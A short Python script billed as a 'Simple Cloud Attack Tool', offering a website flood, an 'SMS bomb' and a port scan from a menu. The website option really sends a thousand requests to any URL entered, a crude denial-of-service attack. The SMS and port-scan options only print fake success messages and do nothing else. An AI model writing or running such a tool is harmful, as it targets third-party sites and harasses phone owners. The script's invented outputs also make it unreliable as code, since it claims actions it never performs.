#!/usr/bin/env python3
import os
import requests
import threading

print("🛡️ Simple Cloud Attack Tool")
print("1. Website Down")
print("2. SMS Bomb")
print("3. Port Scan")

choice = input("Choose: ")

if choice == '1':
    url = input("Enter URL: ")
    for i in range(1000):
        try:
            requests.get(url)
            print(f"Request {i} sent")
        except:
            pass

elif choice == '2':
    phone = input("Enter phone: ")
    for i in range(100):
        print(f"SMS {i} sent to {phone}")

elif choice == '3':
    target = input("Enter IP: ")
    for port in [21,22,80,443]:
        print(f"Checking port {port}")
